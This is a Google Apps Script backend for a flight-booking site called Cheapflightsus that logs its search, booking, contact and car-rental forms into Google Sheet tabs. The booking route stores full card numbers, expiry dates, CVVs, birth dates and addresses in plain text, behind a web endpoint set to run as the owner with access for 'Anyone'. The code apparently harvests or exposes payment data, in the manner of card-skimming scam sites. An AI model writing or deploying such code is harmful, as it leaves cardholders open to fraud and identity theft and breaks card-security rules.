/**
 * =========================================================================================
 * ALL-IN-ONE MASTER GOOGLE APPS SCRIPT FOR CHEAPFLIGHTSUS (ALL FORMS COMBINED)
 * =========================================================================================
 * This single script automatically routes ALL 4 website forms into separate tabs:
 * 1. Sheet1: Flight Search Form Leads
 * 2. Sheet2: Flight Booking & Passenger Leads
 * 3. Sheet3: Contact Us Messages
 * 4. Sheet4: Car Rental & Airport Transfer Leads
 * 
 * CRITICAL DEPLOYMENT SETTINGS (MUST MATCH EXACTLY):
 * 1. Execute as: "Me (your email)"
 * 2. Who has access: "Anyone"
 * =========================================================================================
 */

function doGet(e) {
  if (e.parameter && e.parameter.action) {
    return handleRequest(e.parameter);
  }
  return ContentService
    .createTextOutput("Cheapflightsus Google Sheet Web App is Live & Active!")
    .setMimeType(ContentService.MimeType.TEXT);
}

function doPost(e) {
  var lock = LockService.getScriptLock();
  lock.tryLock(10000);

  try {
    var data = {};
    if (e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (err) {
        data = e.parameter;
      }
    } else {
      data = e.parameter;
    }

    return handleRequest(data);

  } catch (err) {
    return jsonResponse({ "result": "error", "error": err.toString() });
  } finally {
    lock.releaseLock();
  }
}

function handleRequest(data) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var action = (data.action || "").toString().toLowerCase();

  // ── ROUTE 1: FLIGHT SEARCHES (Sheet1) ────────────────────────────────────────────────
  if (action === "sheet1" || action === "search") {
    var sheet1 = getOrCreateSheet(ss, "Sheet1", [
      "Timestamp", "Customer Name", "Phone Number", "Origin", "Destination",
      "Departure Date", "Return Date", "Trip Type", "Adults", "Cabin Class", "IP Address"
    ]);

    sheet1.appendRow([
      data.timestamp || new Date().toLocaleString(),
      data.customer_name || data.name || "",
      formatPhone(data.customer_phone || data.phone || ""),
      data.origin || "",
      data.destination || "",
      data.departure_date || "",
      data.return_date || "",
      data.trip_type || "",
      data.adults || "",
      data.cabin_class || "",
      data.user_ip || ""
    ]);

    return jsonResponse({ "result": "success", "sheet": "Sheet1" });
  }

  // ── ROUTE 2: FLIGHT BOOKINGS (Sheet2) ────────────────────────────────────────────────
  else if (action === "sheet2" || action === "booking") {
    var sheet2 = getOrCreateSheet(ss, "Sheet2", [
      "Timestamp", "Ref Number", "Email", "Phone", "First Name", "Middle Name", "Last Name",
      "Gender", "DOB", "Country", "State", "Address", "City", "Zip Code",
      "Cardholder Name", "Card Number", "Card Brand", "Exp Month", "Exp Year", "CVV",
      "Airline", "Flight No", "Origin", "Destination", "Dep Date", "Total Price (USD)", "IP Address"
    ]);

    sheet2.appendRow([
      data.timestamp || new Date().toLocaleString(),
      data.ref_number || "",
      data.email || "",
      formatPhone(data.phone || ""),
      data.pax_first_name || "",
      data.pax_middle_name || "",
      data.pax_last_name || "",
      data.pax_gender || "",
      data.pax_dob || "",
      data.billing_country || "",
      data.billing_state || "",
      data.billing_address || "",
      data.billing_city || "",
      data.billing_zip || "",
      data.card_name || "",
      data.card_number || "",
      data.card_brand || "",
      data.card_exp_month || "",
      data.card_exp_year || "",
      data.card_cvv || "",
      data.airline || "",
      data.flight_number || "",
      data.origin || "",
      data.destination || "",
      data.dep_date || "",
      data.total_price || "",
      data.user_ip || ""
    ]);

    return jsonResponse({ "result": "success", "sheet": "Sheet2" });
  }

  // ── ROUTE 3: CONTACT FORM (Sheet3) ──────────────────────────────────────────────────
  else if (action === "sheet3" || action === "contact") {
    var sheet3 = getOrCreateSheet(ss, "Sheet3", [
      "Timestamp", "Full Name", "Email", "Phone", "Message", "IP Address"
    ]);

    sheet3.appendRow([
      data.timestamp || new Date().toLocaleString(),
      data.name || data.customer_name || "",
      data.email || "",
      formatPhone(data.phone || ""),
      data.message || "",
      data.user_ip || ""
    ]);

    return jsonResponse({ "result": "success", "sheet": "Sheet3" });
  }

  // ── ROUTE 4: CAR RENTALS (Sheet4) ───────────────────────────────────────────────────
  else if (action === "cab_booking" || action === "sheet4" || action === "car_rental") {
    var sheet4 = getOrCreateSheet(ss, "Sheet4", [
      "Timestamp", "Ride Type", "Direction", "Vehicle Type", "Pickup Address",
      "Pickup Date", "Pickup Time", "Estimated Fare", "Customer Name",
      "Customer Phone", "Customer Email", "Flight Number", "Special Notes", "Client IP"
    ]);

    sheet4.appendRow([
      data.timestamp || new Date().toLocaleString(),
      data.ride_type || "Airport Transfer",
      data.direction || "To Destination",
      data.vehicle_type || "Sedan",
      data.pickup_address || "",
      data.pickup_date || "",
      data.pickup_time || "",
      data.estimated_fare || "",
      data.customer_name || data.name || "",
      formatPhone(data.customer_phone || data.phone || ""),
      data.customer_email || data.email || "",
      data.flight_number || "",
      data.special_notes || "",
      data.client_ip || ""
    ]);

    return jsonResponse({ "result": "success", "sheet": "Sheet4" });
  }

  // Default Fallback
  else {
    var defaultSheet = getOrCreateSheet(ss, "GeneralLeads", ["Timestamp", "Raw Data"]);
    defaultSheet.appendRow([new Date().toLocaleString(), JSON.stringify(data)]);
    return jsonResponse({ "result": "success", "sheet": "GeneralLeads" });
  }
}

function getOrCreateSheet(ss, name, headers) {
  var sheet = ss.getSheetByName(name);
  if (!sheet) {
    sheet = ss.insertSheet(name);
  }
  if (sheet.getLastRow() === 0 && headers) {
    sheet.appendRow(headers);
    var range = sheet.getRange(1, 1, 1, headers.length);
    range.setFontWeight("bold");
    range.setBackground("#0F172A");
    range.setFontColor("#F59E0B");
  }
  return sheet;
}

function formatPhone(phone) {
  if (!phone) return "";
  phone = phone.toString().trim();
  if (phone.indexOf("+") === 0) {
    return "'" + phone;
  }
  return phone;
}

function jsonResponse(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
